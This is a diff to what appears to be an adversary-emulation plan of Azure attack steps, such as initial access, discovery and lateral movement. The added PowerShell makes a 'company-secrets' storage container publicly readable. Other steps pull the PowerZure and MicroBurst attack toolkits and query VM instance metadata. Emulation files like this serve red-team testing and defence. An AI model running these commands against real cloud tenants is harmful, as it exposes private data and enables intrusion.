@@ -23,7 +23,21 @@
     windows:
       psh,pwsh:
         command: |
-          az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}"
+          if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) { ; }
+          else { Install-Module -Name Az -Force }; ;
+          $azAppId ="#{identity.app.id}";
+          $azTenantId= "#{identity.tenant}";
+          $azPass = ConvertTo-SecureString "#{identity.app.pw}" -AsPlainText -Force;
+          $cred = New-Object System.Management.Automation.PSCredential($azAppId , $azPass);
+          Connect-AzAccount -Credential $cred -TenantId $azTenantId  -ServicePrincipal;
+          $rgName = "casandbox";
+          $accountName = "importantshare";
+          $storageAccount = Get-AzStorageAccount -ResourceGroupName $rgName -Name $accountName;
+          $ctx = $storageAccount.Context;
+          $containerName = "company-secrets";
+          Get-AzStorageContainerAcl -Container $containerName -Context $ctx;
+          Set-AzStorageContainerAcl -Container $containerName -Permission Container -Context $ctx;
+          Get-AzStorageContainerAcl -Container $containerName -Context $ctx;
 
   input_arguments:
     identity.app.id:
@@ -42,7 +56,21 @@
   executors:
     - name: powershell
       command: |
-        az login --service-principal -u #{identity.app.id} -p #{identity.app.pw} --tenant #{identity.tenant}
+        if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) { ; }
+        else { Install-Module -Name Az -Force }; ;
+        $azAppId ="#{identity.app.id}";
+        $azTenantId= "#{identity.tenant}";
+        $azPass = ConvertTo-SecureString "#{identity.app.pw}" -AsPlainText -Force;
+        $cred = New-Object System.Management.Automation.PSCredential($azAppId , $azPass);
+        Connect-AzAccount -Credential $cred -TenantId $azTenantId  -ServicePrincipal;
+        $rgName = "casandbox";
+        $accountName = "importantshare";
+        $storageAccount = Get-AzStorageAccount -ResourceGroupName $rgName -Name $accountName;
+        $ctx = $storageAccount.Context;
+        $containerName = "company-secrets";
+        Get-AzStorageContainerAcl -Container $containerName -Context $ctx;
+        Set-AzStorageContainerAcl -Container $containerName -Permission Container -Context $ctx;
+        Get-AzStorageContainerAcl -Container $containerName -Context $ctx;
 
 - id: e6a0bc92-f775-4797-9ea6-554e391c1eba
   name: Initial Access External Remote Services
@@ -58,9 +86,22 @@
     windows:
       psh,pwsh:
         command: |
-          az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.upstream.image} --cpu 1 --memory 1
+          az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+          az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.upstream.image} --cpu 1 --memory 1;
 
   input_arguments:
+    identity.app.id:
+      description: ID of Service principal generated for CLI usage
+      type: string
+      default: unknown
+    identity.app.pw:
+      description: Password returned by service principal creation
+      type: string
+      default: unknown
+    identity.tenant:
+      description: ID of tenant service principal is assigned to
+      type: string
+      default: unknown
     cloud.resource.group:
       description: Name of resource group
       type: string
@@ -81,6 +122,7 @@
   executors:
   - name: powershell
     command: |
+      az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
       az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.upstream.image} --cpu 1 --memory 1
 
 - id: 8ae65b34-3427-4f64-ad75-490868ffc739
@@ -96,14 +138,16 @@
     windows:
       psh,pwsh:
         command: |
-          git clone https://github.com/hausec/PowerZure.git &&
-          Import-Module .\Powerzure\PowerZure.psm1 &&
+          az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+          git clone https://github.com/hausec/PowerZure.git;
+          Import-Module .\Powerzure\PowerZure.psm1;
           Get-AzureUser -All
   executors:
   - name: powershell
     command: |
-      git clone https://github.com/hausec/PowerZure.git &&
-      Import-Module .\Powerzure\PowerZure.psm1 &&
+      az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+      git clone https://github.com/hausec/PowerZure.git;
+      Import-Module .\Powerzure\PowerZure.psm1;
       Get-AzureUser -All
 
 - id: e3ce8b20-c7dc-48f7-9412-f6a0d7159a9e
@@ -119,9 +163,22 @@
     windows:
       psh,pwsh:
         command: |
+          az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
           az acr import -n #{container.registry} --source #{container.upstream.image_b} -t #{container.registry}:#{container.upstream.image_b.tag}
 
   input_arguments:
+    identity.app.id:
+      description: ID of Service principal generated for CLI usage
+      type: string
+      default: unknown
+    identity.app.pw:
+      description: Password returned by service principal creation
+      type: string
+      default: unknown
+    identity.tenant:
+      description: ID of tenant service principal is assigned to
+      type: string
+      default: unknown
     cloud.resource.group:
       description: Name of resource group
       type: string
@@ -150,7 +207,8 @@
   executors:
   - name: powershell
     command: |
-      az acr import -n #{container.registry} --source #{container.upstream.image_b} -t #{container.registry}:#{container.upstream.image_b.tag}
+      az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+      az acr import -n #{container.registry} --source #{container.upstream.image_b} -t #{container.registry}:#{container.upstream.image_b.tag};
 
 - id: 567c748d-e87a-4ebf-85c1-9a9cf1fd62f0
   name: Spawn container
@@ -165,11 +223,26 @@
     windows:
       psh,pwsh:
         command: |
-          az group create --name #{cloud.resource.group} --location #{cloud.location} &&
-          az acr create --resource-group #{cloud.resource.group} --name #{container.registry} --sku Basic &&
-          az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.image} --cpu 1 --memory 1
+          az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+          $rdm = Get-Random;
+          $ctrname = "test-ctr-"
+          $ctrname += $rdm
+          New-AzContainerInstanceObject -Name $ctrname -Image hello-world:latest -RequestCpu 1 -RequestMemoryInGb 1.5;
+          az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.image} --cpu 1 --memory 1;
 
   input_arguments:
+    identity.app.id:
+      description: ID of Service principal generated for CLI usage
+      type: string
+      default: unknown
+    identity.app.pw:
+      description: Password returned by service principal creation
+      type: string
+      default: unknown
+    identity.tenant:
+      description: ID of tenant service principal is assigned to
+      type: string
+      default: unknown
     cloud.resource.group:
       description: Name of resource group
       type: string
@@ -185,7 +258,7 @@
     container.image:
       description: Container image name and tag
       type: string
-      default: "justsomeregistry.aurecr.io/targetrepository:targettag"
+      default: "justsomeregistry.azurecr.io/targetrepository:targettag"
     container.registry:
       description: Name of Azure Container Registry
       type: string
@@ -194,9 +267,10 @@
   executors:
   - name: powershell
     command: |
-      az group create --name #{cloud.resource.group} --location #{cloud.location} &&
-      az acr create --resource-group #{cloud.resource.group} --name #{container.registry} --sku Basic &&
-      az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.image} --cpu 1 --memory 1
+      az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+      az group create --name #{cloud.resource.group} --location #{cloud.location};
+      az acr create --resource-group #{cloud.resource.group} --name #{container.registry} --sku Basic;
+      az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.image} --cpu 1 --memory 1;
 
 
 - id: fbbd13f9-d129-4737-aa75-70e1391be1d8
@@ -212,8 +286,8 @@
     windows:
       psh,pwsh:
         command: |
-          git clone https://github.com/hausec/PowerZure.git &&
-          Import-Module .\Powerzure\PowerZure.psm1 &&
+          git clone https://github.com/hausec/PowerZure.git;
+          Import-Module .\Powerzure\PowerZure.psm1;
           Invoke-AzureRunCommand -VMName #{vm.name} -Command 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"'
 
   input_arguments:
@@ -225,8 +299,8 @@
   executors:
     - name: powershell
       command: |
-        git clone https://github.com/hausec/PowerZure.git &&
-        Import-Module .\Powerzure\PowerZure.psm1 &&
+        git clone https://github.com/hausec/PowerZure.git;
+        Import-Module .\Powerzure\PowerZure.psm1;
         Invoke-AzureRunCommand -VMName #{vm.name} -Command 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"'
 
 - id: e28963a8-8b91-4b57-a554-2b72fc467f75
@@ -242,16 +316,16 @@
     windows:
       psh,pwsh:
         command: |
-          git clone https://github.com/NetSPI/MicroBurst.git &&
-          Import-Module .\MicroBurst\MicroBurst.psm1 &&
-          Get-AzDomainInfo -folder MicroBurst -Verbose
+          git clone https://github.com/NetSPI/MicroBurst.git;
+          Import-Module .\MicroBurst\MicroBurst.psm1;
+          Get-AzDomainInfo -folder MicroBurst -Verbose;
 
   executors:
     - name: powershell
       command: |
-        git clone https://github.com/NetSPI/MicroBurst.git &&
-        Import-Module .\MicroBurst\MicroBurst.psm1 &&
-        Get-AzDomainInfo -folder MicroBurst -Verbose
+        git clone https://github.com/NetSPI/MicroBurst.git;
+        Import-Module .\MicroBurst\MicroBurst.psm1;
+        Get-AzDomainInfo -folder MicroBurst -Verbose;
 
 - id: bbb0c079-2a95-475c-9509-e23fcc6131b4
   name: Discovery Container and Resources
@@ -266,8 +340,8 @@
     windows:
       cmd:
         command: |
-          Import-Module .\MicroBurst\MicroBurst.psm1 &&
-          Get-AzACR -username "#{acr.username}" -password "#{acr.password}" -registry "http://#{container.registry}.azurecr.io"
+          Import-Module .\MicroBurst\MicroBurst.psm1;
+          Get-AzACR -username "#{acr.username}" -password "#{acr.password}" -registry "http://#{container.registry}.azurecr.io";
 
   input_arguments:
     acr.username:
@@ -286,8 +360,8 @@
   executors:
     - name: powershell
       command: |
-        Import-Module .\MicroBurst\MicroBurst.psm1 &&
-        Get-AzACR -username "#{acr.username}" -password "#{acr.password}" -registry "http://#{container.registry}.azurecr.io"
+        Import-Module .\MicroBurst\MicroBurst.psm1;
+        Get-AzACR -username "#{acr.username}" -password "#{acr.password}" -registry "http://#{container.registry}.azurecr.io";
 
 - id: aa2c4311-5ee2-447e-952e-2c2a6bfb9d6c
   name: Lateral Movement
@@ -302,7 +376,7 @@
     windows:
       cmd:
         command: |
-          az container attach --name publicapp --resource-group #{cloud.resource.group}
+          az container attach --name publicapp --resource-group #{cloud.resource.group};
 
   input_arguments:
     cloud.resource.group:
@@ -321,4 +395,4 @@
   executors:
     - name: command_prompt
       command: |
-        az container attach --name publicapp --resource-group #{cloud.resource.group}
+        az container attach --name publicapp --resource-group #{cloud.resource.group};
